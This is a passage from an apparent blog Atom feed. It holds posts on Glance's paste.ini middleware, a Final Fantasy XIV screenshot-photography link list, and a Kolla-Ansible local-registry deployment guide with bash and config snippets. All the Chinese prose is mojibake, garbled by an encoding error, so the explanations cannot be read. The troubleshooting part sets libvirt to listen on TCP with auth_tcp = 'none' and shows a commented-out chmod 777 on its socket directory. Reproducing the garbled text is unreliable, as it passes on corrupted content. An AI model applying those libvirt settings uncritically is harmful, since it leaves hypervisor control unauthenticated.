glance.api.middleware.context:ContextMiddleware.factory</span><br><span class="line"></span><br><span class="line"><span class="section">[filter:unauthenticated-context]</span></span><br><span class="line"><span class="attr">paste.filter_factory</span> = glance.api.middleware.context:UnauthenticatedContextMiddleware.factory</span><br><span class="line"></span><br><span class="line"><span class="section">[filter:authtoken]</span></span><br><span class="line"><span class="attr">paste.filter_factory</span> = keystonemiddleware.auth_token:filter_factory</span><br><span class="line"><span class="attr">delay_auth_decision</span> = <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="section">[filter:gzip]</span></span><br><span class="line"><span class="attr">paste.filter_factory</span> = glance.api.middleware.gzip:GzipMiddleware.factory</span><br><span class="line"></span><br><span class="line"><span class="section">[filter:osprofiler]</span></span><br><span class="line"><span class="attr">paste.filter_factory</span> = osprofiler.web:WsgiMiddleware.factory</span><br><span class="line"><span class="attr">hmac_keys</span> = SECRET_KEY  <span class="comment">#DEPRECATED</span></span><br><span class="line"><span class="attr">enabled</span> = <span class="literal">yes</span>  <span class="comment">#DEPRECATED</span></span><br><span class="line"></span><br><span class="line"><span class="section">[filter:cors]</span></span><br><span class="line"><span class="attr">paste.filter_factory</span> =  oslo_middleware.cors:filter_factory</span><br><span class="line"><span class="attr">oslo_config_project</span> = glance</span><br><span class="line"><span class="attr">oslo_config_program</span> = glance-api</span><br><span class="line"></span><br><span class="line"><span class="section">[filter:http_proxy_to_wsgi]</span></span><br><span class="line"><span class="attr">paste.filter_factory</span> = oslo_middleware:HTTPProxyToWSGI.factory</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ° pipeline æœ€åçš„æ€»æ˜¯ rootapp åº”ç”¨ï¼Œ<code>paste.composite_factory</code> è®¾ç½®åº”ç”¨çš„å·¥å‚å‡½æ•°</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[composite:rootapp]</span></span><br><span class="line"><span class="attr">paste.composite_factory</span> = glance.api:root_app_factory</span><br><span class="line">/: apiversions</span><br><span class="line">/v2: apiv2app</span><br></pre></td></tr></table></figure><p>å®šä½æºç  glance/api.py çš„ root_app_factory å‡½æ•°ï¼Œæ˜¾ç„¶æ˜¯ç”¨äºè®¾ç½® url æ˜ å°„çš„ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">root_app_factory</span>(<span class="params">loader, global_conf, **local_conf</span>):</span></span><br><span class="line">    <span class="keyword">return</span> paste.urlmap.urlmap_factory(loader, global_conf, **local_conf)</span><br></pre></td></tr></table></figure><p>ç”±äºæˆ‘ä¸»è¦å…³æ³¨çš„æ˜¯æœåŠ¡çš„å¯åŠ¨æ–¹å¼ï¼Œå› æ­¤ URL æ˜ å°„å…·ä½“æ˜¯å¦‚ä½•å®ç°çš„å¹¶æ²¡æœ‰äº†è§£ã€‚é€šè¿‡ paste.ini æ–‡ä»¶å¯ä»¥çŸ¥é“è¯·æ±‚åˆ°è¾¾çœŸæ­£çš„åº”ç”¨å‰ç»è¿‡äº†ä»€ä¹ˆä¸­é—´ä»¶ï¼ˆè¿‡æ»¤å™¨ï¼‰çš„å¤„ç†ï¼Œè¿™äº›ä¸­é—´ä»¶çš„æºç ä¹Ÿå¯ä»¥çœ‹ä¸€çœ‹ã€‚</p><h1 id="å‚é˜…"><a href="#å‚é˜…" class="headerlink" title="å‚é˜…"></a>å‚é˜…</h1><ul><li><a href="https://docs.openstack.org/glance/latest/admin/apache-httpd.html">Running Glance in HTTPD</a></li><li><a href="https://pastedeploy.readthedocs.io/en/latest/">Paste Deployment</a></li><li><a href="https://blog.csdn.net/Jmilk/article/details/52081748">Openstack Paste.ini æ–‡ä»¶è¯¦è§£</a></li></ul>]]></content>
    
    
    <summary type="html">é€šè¿‡ setup.cfg é…ç½®æ–‡ä»¶æ‰¾åˆ°ç»„ä»¶æœåŠ¡çš„å¯åŠ¨å…¥å£</summary>
    
    
    
    <category term="OpenStack" scheme="https://jckling.github.io/categories/OpenStack/"/>
    
    
    <category term="Python" scheme="https://jckling.github.io/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>FF14 å…‰ä¹‹æ‘„å½±å¸ˆå…»æˆè®¡åˆ’âœ¨</title>
    <link href="https://jckling.github.io/2021/06/24/Game/FFXIV/FF14-%E5%85%89%E4%B9%8B%E6%91%84%E5%BD%B1%E5%B8%88%E5%85%BB%E6%88%90%E8%AE%A1%E5%88%92/"/>
    <id>https://jckling.github.io/2021/06/24/Game/FFXIV/FF14-%E5%85%89%E4%B9%8B%E6%91%84%E5%BD%B1%E5%B8%88%E5%85%BB%E6%88%90%E8%AE%A1%E5%88%92/</id>
    <published>2021-06-24T08:11:35.000Z</published>
    <updated>2021-10-11T13:39:04.657Z</updated>
    
    <content type="html"><![CDATA[<div class="note primary flat"><p>ğŸ•¹ï¸ æ‹›å¾…ç  <code>0295-a3be-vax6-04fv</code>ï¼Œ<a href="https://ff.web.sdo.com/entertain">ç™»é™†é¡µé¢</a> ç‚¹å‡»ã€è¢«æ‹›å¾…è€…ã€‘ï¼Œåœ¨é¡µé¢ä¸Šè¾“å…¥æ‹›å¾…ç ï¼Œé©¬ä¸Šç»“æˆæ‹›å¾…å…³ç³»ï¼</p></div><h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>é™†é™†ç»­ç»­å­˜äº†ä¸å°‘æˆªå›¾ç›¸å…³çš„é“¾æ¥ï¼Œè™½ç„¶æ²¡æœ‰éƒ½çœ‹è¿‡xd</p><p>è¶ç€æ‘¸é±¼çš„æ—¶å€™ç¨å¾®ç†ä¸€ç†ã€‚</p><h1 id="ç›¸å…³é“¾æ¥"><a href="#ç›¸å…³é“¾æ¥" class="headerlink" title="ç›¸å…³é“¾æ¥"></a>ç›¸å…³é“¾æ¥</h1><h2 id="NGA"><a href="#NGA" class="headerlink" title="NGA"></a>NGA</h2><p><strong><a href="https://bbs.nga.cn/thread.php?key=%5B%E5%B9%BB%E5%8C%96%E6%B0%B5%5D&fid=-362960">NGA æœç´¢ - å¹»åŒ–æ°µ</a></strong><br>æœç´¢ <code>å¹»åŒ–</code> æˆ– <code>å¹»åŒ–æ°µ</code> æŸ¥æ‰¾ç›¸å…³å¸–å­</p><p><strong><a href="https://bbs.nga.cn/read.php?tid=20459393">[å¹»åŒ–å¤–è§‚æ•´ç†] äººå¶å…µè£…ä½¿ç”¨è¯´æ˜ä¹¦</a></strong><br>è£…å¤‡ä¸€è§ˆï¼ŒåŒ…æ‹¬å¥—è£…ã€æ­¦å™¨ç­‰ï¼Œç»™å‡ºäº†è£…å¤‡çš„å‡ºå¤„</p><p><strong><a href="https://bbs.nga.cn/read.php?tid=16198912">[FF143Arealè¡¥ä¸è”åŠ¨]æ‹ç…§æ‰“å…‰æ•™ç¨‹</a></strong><br>æ‰“å…‰æ•™ç¨‹ï¼Œå¹³æ—¶ç”¨çš„ GShade ä¸æ˜¯ 3Arealï¼Œæ‰“å…‰å¯ä»¥å­¦ä¹ </p><p><strong><a href="https://bbs.nga.cn/read.php?tid=14869355">[å…‰ä¹‹æš–æš–][æŠ•å½±][å¹»åŒ–]å¦‚ä½•æ‰¾å¤–è§‚ï¼Œè·å¾—ã€é¢„è§ˆå¤–è§‚ï¼Œçœ‹ä¹°å®¶ç§€</a></strong><br>å¦‚é¢˜</p><p><strong><a href="https://bbs.nga.cn/read.php?tid=12931368">[å…‰ä¹‹æ‘„å½±] è¿Ÿåˆ°è€Œå†—é•¿çš„æ‰“å…‰ç»ƒä¹ è¯¾</a></strong><br>æ—¶é—´æ¯”è¾ƒæ—©çš„ä¸€ä¸ªæ‰“å…‰æ•™ç¨‹</p><h2 id="å¾®åš"><a href="#å¾®åš" class="headerlink" title="å¾®åš"></a>å¾®åš</h2><p><strong><a href="https://weibo.com/u/2448465132?sudaref=bbs.nga.cn&is_all=1">æœ€ç»ˆå¹»æƒ³14_ç§˜é“¶ä¹‹çœ¼æ‚å¿—ç¤¾</a></strong><br>åªæ¥å—å¤šå›¾æŠ•ç¨¿ï¼Œæˆ‘æ„Ÿè§‰å¤§å¤šéƒ½æ˜¯ç²¾ä¿®å•Šx</p><p><strong><a href="https://weibo.com/ffxivnge?refer_flag=1005055013_&is_all=1">è‰¾æ¬§æ³½äºšåœ°ç†é¢‘é“</a></strong><br>è²Œä¼¼ä¸»è¦æ˜¯åœºæ™¯æ‘„å½±ï¼Œè´¨é‡éƒ½å¾ˆé«˜ï¼ˆä¸€ç›´éƒ½ä¸çŸ¥é“æ˜¯æ€ä¹ˆæ‹çš„qwqï¼‰</p><p><strong><a href="https://weibo.com/u/6532495419?refer_flag=1005055013_&is_all=1">ä»Šå¤©æœ‰äººç”·å¸å—</a></strong><br>äººç”· botï¼Œä¸è¦ cos å·ï¼ˆæ‚„æ‚„</p><p><strong><a href="https://weibo.com/u/7643695382">æœ€ç»ˆå¹»æƒ³14æ•–é¾™æ—ç”·æ€§bot</a></strong><br>é¾™ç”· botï¼Œå¥½è…°å¥½è…°ï¼Œå¥½å¸…å¥½å¸…</p><p><strong><a href="https://weibo.com/u/5308654606">çŒ«ç”·bot</a></strong><br>çŒ«ç”· botï¼Œã€Šå¤§æ…ˆå¤§æ‚²ã€‹-ä½£å…µå¤´-æŒ‡æŒ¥å®˜ï¼ˆæ‰ä¸æ˜¯åè§å‘¢ï¼ï¼‰</p><p><strong><a href="https://weibo.com/u/6410821334?refer_flag=1005055013_&is_all=1">è‰¾æ¬§æ³½äºšæŠ•å½±å›¾é‰´</a></strong><br>æ¯å¤©ç²¾é€‰ä¸€äº›é‰´èµç«™ç‚¹ <a href="https://mirapri.com/">MIRAPRI SNAP</a> ä¸Šçš„å¹»åŒ–æ­é…ï¼ŒåŒæ—¶æ¥å—ç©å®¶æŠ•ç¨¿</p><hr><p>å¤§å®¶åˆ†äº«çš„æˆªå›¾åœºæ™¯ï¼Œå½“ç„¶ä¹Ÿæ¨èå…³æ³¨è¿™äº›ç”¨æˆ·å•¦~</p><ul><li><a href="https://weibo.com/ttarticle/p/show?id=2309404649531215052981#_0">FF14ä¸ªäººå¸¸ç”¨æˆªå›¾åœ°ç‚¹åˆ†äº«-1</a></li><li><a href="https://weibo.com/3181607480/KiF9aD8TT?type=comment#_rnd1624526720401">Gshade æ»¤é•œåˆ†äº«</a></li><li><a href="https://weibo.com/ttarticle/p/show?id=2309404634681193923044#_0">ã€FF14ã€‘Miaçš„æˆªå›¾åœ°ç‚¹æ•´ç†ï¼ˆ6ï¼‰</a></li><li><a href="https://weibo.com/ttarticle/p/show?id=2309404648464289235597#_0">ã€Gshadeã€‘ç®€å•çš„é¢„è®¾å®‰åˆ©2+ä½¿ç”¨è¿›é˜¶</a></li></ul><h2 id="é‰´èµç«™ç‚¹"><a href="#é‰´èµç«™ç‚¹" class="headerlink" title="é‰´èµç«™ç‚¹"></a>é‰´èµç«™ç‚¹</h2><p><strong><a href="https://www.ffxivcollection.com/">FFXIV ARMOURY COLLECTION</a></strong><br>å’Œäººå¶å…µè£…ç›¸åŒï¼Œæ¸¸æˆå¥—è£…å±•ç¤º</p><p><strong><a href="https://mirapri.com/">MIRAPRI SNAP</a></strong><br>ç©å®¶å¹»åŒ–æŠ•ç¨¿ï¼ˆæ—¥æ–‡ï¼‰</p><p><strong><a href="https://www.ffxivsc.cn/">å…‰ä¹‹æ”¶è—å®¶</a></strong><br>ç©å®¶å¹»åŒ–æŠ•ç¨¿ï¼ˆä¸­æ–‡ï¼‰</p><p><strong><a href="https://ffxiv.eorzeacollection.com/">Eorzea Collection</a></strong><br><a href="https://ffxiv.eorzeacollection.com/gearsets">gearsets</a> ä¹Ÿæ˜¯æ¸¸æˆå¥—è£…å±•ç¤ºï¼Œ<a href="https://ffxiv.eorzeacollection.com/glamours">glamours</a> æ˜¯ç©å®¶æŠ•ç¨¿</p><h1 id="Discord-ç¾¤ç»„"><a href="#Discord-ç¾¤ç»„" class="headerlink" title="Discord ç¾¤ç»„"></a>Discord ç¾¤ç»„</h1><p><strong><a href="https://discord.gg/thncM4An">GPOSERS</a></strong><br>Gshade å®˜æ–¹ç¾¤ç»„ï¼Œå¯ä»¥åœ¨é‡Œé¢æé—®å’Œåˆ†äº«æˆªå›¾</p><p><strong><a href="https://discord.gg/ffxivtextools">FFXIV TEXTOOLS &amp; MODDING</a></strong><br>TexTools å®˜æ–¹ç¾¤ç»„ï¼Œæœ‰æ¨¡å‹å’Œç©å®¶æˆªå›¾çš„åˆ†äº«</p><p><strong><a href="https://discord.gg/xivmalemods">FFXIV MALE MODS</a></strong><br>TexTools æ¨¡å‹åˆ†äº«ï¼Œä¹Ÿæœ‰ç©å®¶æˆªå›¾åˆ†äº«</p><p><strong><a href="https://discord.gg/crystallinemeans">THE Crystalline Means</a></strong><br>CMTool å®˜æ–¹ç¾¤ç»„ï¼Œå¯ä»¥åœ¨é‡Œé¢æé—®å’Œåˆ†äº«æˆªå›¾</p><h1 id="TBC"><a href="#TBC" class="headerlink" title="TBC"></a>TBC</h1>]]></content>
    
    
    <summary type="html">æ‘¸é±¼æ—¶æ”¶é›†çš„æˆªå›¾æŠ€å·§é“¾æ¥æ•´ç†(ï½¥Ï‰&lt;)â˜†</summary>
    
    
    
    <category term="Game" scheme="https://jckling.github.io/categories/Game/"/>
    
    
    <category term="FFXIV" scheme="https://jckling.github.io/tags/FFXIV/"/>
    
  </entry>
  
  <entry>
    <title>Kolla-Ansible æœ¬åœ°ä»“åº“éƒ¨ç½²</title>
    <link href="https://jckling.github.io/2021/06/14/OpenStack/Kolla-Ansible%20%E6%9C%AC%E5%9C%B0%E4%BB%93%E5%BA%93%E9%83%A8%E7%BD%B2/"/>
    <id>https://jckling.github.io/2021/06/14/OpenStack/Kolla-Ansible%20%E6%9C%AC%E5%9C%B0%E4%BB%93%E5%BA%93%E9%83%A8%E7%BD%B2/</id>
    <published>2021-06-14T13:17:43.000Z</published>
    <updated>2021-10-11T13:39:04.665Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ç¯å¢ƒå‡†å¤‡"><a href="#ç¯å¢ƒå‡†å¤‡" class="headerlink" title="ç¯å¢ƒå‡†å¤‡"></a>ç¯å¢ƒå‡†å¤‡</h1><p>åœ¨ <a href="https://jckling.github.io/2021/05/31/OpenStack/OpenStack%20%E5%8D%95%E6%9C%BA%E9%83%A8%E7%BD%B2%20%E2%80%94%E2%80%94%20Kolla-Ansible/">OpenStack å•æœºéƒ¨ç½² â€”â€” Kolla-Ansible</a> çš„åŸºç¡€ä¸Šï¼Œæ”¹ç”¨æœ¬åœ°é•œåƒä»“åº“ï¼Œä»æºç æ„å»ºé•œåƒå¹¶éƒ¨ç½² OpenStack all-in-oneã€‚</p><h1 id="éƒ¨ç½²æœ¬åœ°ä»“åº“-Docker-Registry"><a href="#éƒ¨ç½²æœ¬åœ°ä»“åº“-Docker-Registry" class="headerlink" title="éƒ¨ç½²æœ¬åœ°ä»“åº“ Docker Registry"></a>éƒ¨ç½²æœ¬åœ°ä»“åº“ Docker Registry</h1><p><code>kolla-ansible -i all-in-one bootstrap-servers</code> ä¼šæ”¹å˜ docker çš„ç½‘ç»œé…ç½®ï¼Œéœ€è¦åˆ é™¤æ¡¥æ¥é…ç½®ï¼Œå³å¯ç”¨æ¡¥æ¥ï¼Œå¦åˆ™æ„å»ºé•œåƒçš„è¿‡ç¨‹ä¸­æ— æ³•ä¸‹è½½ä¾èµ–åº“ã€‚</p><p>å¦å¤–ï¼Œè¿˜å¯ä»¥æ·»åŠ å›½å†…çš„é•œåƒæºï¼Œæœ€ç»ˆ /etc/docker/daemon.json é…ç½®æ–‡ä»¶çš„å†…å®¹å¦‚ä¸‹ï¼š</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;registry-mirrors&quot;</span>: [</span><br><span class="line">        <span class="string">&quot;http://hub-mirror.c.163.com&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    <span class="attr">&quot;insecure-registries&quot;</span>: [</span><br><span class="line">        <span class="string">&quot;10.112.247.246:4000&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    <span class="attr">&quot;iptables&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">    <span class="attr">&quot;log-opts&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;max-file&quot;</span>: <span class="string">&quot;5&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;max-size&quot;</span>: <span class="string">&quot;50m&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¿®æ”¹é…ç½®æ–‡ä»¶åéœ€è¦é‡å¯ docker æœåŠ¡ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># docker ç½‘ç»œé…ç½®</span></span><br><span class="line">sudo vim /etc/docker/daemon.json</span><br><span class="line"><span class="comment"># åˆ é™¤ bridge: &quot;none&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># é‡å¯ docker æœåŠ¡</span></span><br><span class="line">sudo service docker restart</span><br><span class="line"></span><br><span class="line"><span class="comment"># å°†å½“å‰ç”¨æˆ·åŠ å…¥ docker ç”¨æˆ·ç»„</span></span><br><span class="line">sudo usermod -aG docker <span class="variable">$USER</span></span><br><span class="line">newgrp docker</span><br></pre></td></tr></table></figure><p>è¿è¡Œæœ¬åœ°é•œåƒä»“åº“ï¼Œç”±äº Keystone ä½¿ç”¨äº† 5000 ç«¯å£ï¼Œå› æ­¤è¿™é‡ŒæŒ‡å®šæ˜ å°„åˆ° 4000 ç«¯å£ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># æœ¬åœ°é•œåƒä»“åº“</span></span><br><span class="line">docker run -d \</span><br><span class="line"> --name registry \</span><br><span class="line"> --restart=always \</span><br><span class="line"> -p 4000:5000 \</span><br><span class="line"> -v registry:/var/lib/registry \</span><br><span class="line"> registry:2</span><br></pre></td></tr></table></figure><h1 id="ä½¿ç”¨æœ¬åœ°ä»“åº“"><a href="#ä½¿ç”¨æœ¬åœ°ä»“åº“" class="headerlink" title="ä½¿ç”¨æœ¬åœ°ä»“åº“"></a>ä½¿ç”¨æœ¬åœ°ä»“åº“</h1><p>ä½¿ç”¨ tox åˆ›å»ºé…ç½®æ–‡ä»¶</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># å®‰è£… tox</span></span><br><span class="line">pip install tox</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç”Ÿæˆé…ç½®æ–‡ä»¶</span></span><br><span class="line"><span class="built_in">cd</span> kolla</span><br><span class="line">tox -e genconfig</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ‹·è´é…ç½®æ–‡ä»¶</span></span><br><span class="line">sudo cp etc/kolla/kolla-build.conf /etc/kolla/</span><br></pre></td></tr></table></figure><p>ä¸‹è½½ Keystone æºç ï¼ŒæŒ‡å®š Victoria ç‰ˆæœ¬</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ä¸‹è½½æºç </span></span><br><span class="line"><span class="built_in">cd</span></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/openstack/keystone.git --branch stable/victoria --single-branch</span><br></pre></td></tr></table></figure><p>ä¿®æ”¹é…ç½®æ–‡ä»¶ï¼Œå‡è®¾æœ¬æœº ip ä¸º 10.1.0.240ï¼Œopenstack_release æœ‰è¦æ±‚ï¼ˆéšä¾¿å¡«ä¼šå‡ºé”™ï¼‰</p><ul><li>é»˜è®¤æ„å»ºçš„é•œåƒè¢«æ‰“ä¸Šäº† <code>12.1.0</code> çš„æ ‡ç­¾ï¼Œè¿™é‡Œçš„ openstack_release éœ€è¦æŒ‡å®š registry ä¸­å­˜åœ¨çš„æ ‡ç­¾</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># é…ç½®æºç è·¯å¾„</span></span><br><span class="line">sudo vim /etc/kolla/kolla-build.conf</span><br><span class="line"><span class="comment">#[DEFAULT]</span></span><br><span class="line"><span class="comment">#base = ubuntu</span></span><br><span class="line"><span class="comment">#network_mode = host</span></span><br><span class="line"><span class="comment">#push = true</span></span><br><span class="line"><span class="comment">#registry = 10.1.0.240:4000</span></span><br><span class="line"><span class="comment">#[keystone-base]</span></span><br><span class="line"><span class="comment">#type = local</span></span><br><span class="line"><span class="comment">#location = /home/jck/keystone</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ä½¿ç”¨æœ¬åœ°ä»“åº“</span></span><br><span class="line">sudo vim /etc/kolla/globals.yml</span><br><span class="line"><span class="comment">#docker_registry: 10.1.0.240:4000</span></span><br><span class="line"><span class="comment">#openstack_release: &quot;12.1.0&quot;</span></span><br></pre></td></tr></table></figure><p>æ„å»ºé•œåƒï¼Œä½¿ç”¨ <code>&amp;&gt;</code> å°†è¾“å‡ºé‡å®šå‘åˆ°æ–‡ä»¶ä¸­</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># æºç æ„å»º Keystone é•œåƒ</span></span><br><span class="line">kolla-build -t <span class="built_in">source</span> --config-file /etc/kolla/kolla-build.conf keystone &amp;&gt; keystone-build.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ—å‡ºé•œåƒ</span></span><br><span class="line">docker images</span><br><span class="line"></span><br><span class="line"><span class="comment"># æŸ¥çœ‹æœ¬åœ°ä»“åº“</span></span><br><span class="line">curl -X GET 10.1.0.240:4000/v2/_catalog</span><br></pre></td></tr></table></figure><p>æ„å»ºå®Œæ¯•åï¼Œä½¿ç”¨æ–°é•œåƒæ›´æ–°å½“å‰ç¯å¢ƒ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kolla-ansible upgrade</span><br></pre></td></tr></table></figure><h1 id="å…¶ä»–"><a href="#å…¶ä»–" class="headerlink" title="å…¶ä»–"></a>å…¶ä»–</h1><p>kolla-ansible ç›¸å…³æ“ä½œ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># åˆ é™¤å®¹å™¨</span></span><br><span class="line">kolla-ansible/tools/cleanup-containers</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ é™¤æ‰€æœ‰é•œåƒ</span></span><br><span class="line">kolla-ansible/tools/cleanup-images --all</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ‹‰å–é•œåƒ</span></span><br><span class="line">kolla-ansible pull</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ›´æ–°ç¯å¢ƒ</span></span><br><span class="line">kolla-ansible upgrade</span><br></pre></td></tr></table></figure><p>ç›¸å…³æ–‡ä»¶</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># dockerfile ç›¸å…³</span></span><br><span class="line">~/kolla/docker  <span class="comment"># jinjia2 æ¨¡æ¿æ–‡ä»¶</span></span><br><span class="line">/etc/kolla      <span class="comment"># é•œåƒé…ç½®æ–‡ä»¶</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># é…ç½®æ–‡ä»¶</span></span><br><span class="line">/etc/kolla/kolla-build.conf</span><br><span class="line">/etc/kolla/globals.yml</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ—¥å¿—æ–‡ä»¶</span></span><br><span class="line">/var/<span class="built_in">log</span>/kolla/ <span class="comment"># é“¾æ¥ /var/lib/docker/volumes/kolla_logs/_data/</span></span><br></pre></td></tr></table></figure><p>æ¸…é™¤å®¹å™¨é‡æ–°éƒ¨ç½²ï¼Œé€šå¸¸ä¸ç”¨ <code>./kolla-ansibletools/cleanup-host</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">./kolla-ansible/tools/cleanup-containers</span><br><span class="line">kolla-ansible -i ./all-in-one prechecks</span><br><span class="line">kolla-ansible -i ./all-in-one deploy</span><br><span class="line">kolla-ansible post-deploy</span><br></pre></td></tr></table></figure><h1 id="é—®é¢˜ä¸è§£å†³"><a href="#é—®é¢˜ä¸è§£å†³" class="headerlink" title="é—®é¢˜ä¸è§£å†³"></a>é—®é¢˜ä¸è§£å†³</h1><h2 id="nova-compute-æ³¨å†Œå¤±è´¥"><a href="#nova-compute-æ³¨å†Œå¤±è´¥" class="headerlink" title="nova-compute æ³¨å†Œå¤±è´¥"></a>nova-compute æ³¨å†Œå¤±è´¥</h2><p>æŸ¥çœ‹æ—¥å¿—ä¿¡æ¯è¯´æ˜¯è¿æ¥ä¸ä¸Š libvirt</p><img src="https://i.loli.net/2021/06/15/Pknj9uaUCoq2bgI.jpg"><p>é…ç½®å¹¶é‡å¯ libvirt</p><ul><li><a href="https://askubuntu.com/questions/423425/i-cant-use-libvirt-with-listen-tcp/610350#610350">I canâ€™t use libvirt with listen TCP</a></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/libvirt/libvirtd.conf</span><br><span class="line"><span class="comment">#listen_tls = 0</span></span><br><span class="line"><span class="comment">#listen_tcp = 1</span></span><br><span class="line"><span class="comment">#auth_tcp = &quot;none&quot;</span></span><br><span class="line"><span class="comment">#tcp_port = &quot;16509&quot;</span></span><br><span class="line"></span><br><span class="line">systemctl restart libvirtd</span><br><span class="line"><span class="comment">#sudo chmod -R 777 /var/run/libvirt</span></span><br><span class="line"></span><br><span class="line">ps aux | grep libvirtd</span><br></pre></td></tr></table></figure><p>é‡æ–°éƒ¨ç½²</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># åˆ é™¤å®¹å™¨</span></span><br><span class="line">kolla-ansible/tools/cleanup-containers</span><br><span class="line"></span><br><span class="line"><span class="comment"># éƒ¨ç½²</span></span><br><span class="line">kolla-ansible -i ./all-in-one deploy</span><br><span class="line"></span><br><span class="line"><span class="comment"># é‡æ–°ç”Ÿæˆè®¤è¯æ–‡ä»¶</span></span><br><span class="line">kolla-ansible post-deploy</span><br></pre></td></tr></table></figure><p>ä¸å®‰è£…å’Œé…ç½® libvirtï¼Œä¸” /etc/kolla/globals.yml ä¹Ÿä¸é…ç½® <code>nova_compute_virt_type</code> ä¹Ÿèƒ½æ­£å¸¸æ‰§è¡Œã€‚</p><p>å®‰è£…å®Œæ¯•åæ³¨é‡Šè¯¥é…ç½®ï¼Œé‡æ–° upgrade æ­£å¸¸ï¼Œä¸æ³¨é‡Šè²Œä¼¼ä¹Ÿè¡Œï¼ˆç„å­¦ï¼‰ã€‚</p><p>å®˜æ–¹æŒ‡å‡ºï¼Œç”±äºæŠ€æœ¯åŸå› ï¼Œé…ç½® qemu åä½¿ç”¨ <code>kolla-ansible upgrade</code> å¯èƒ½å‡ºé”™ã€‚</p><ul><li><a 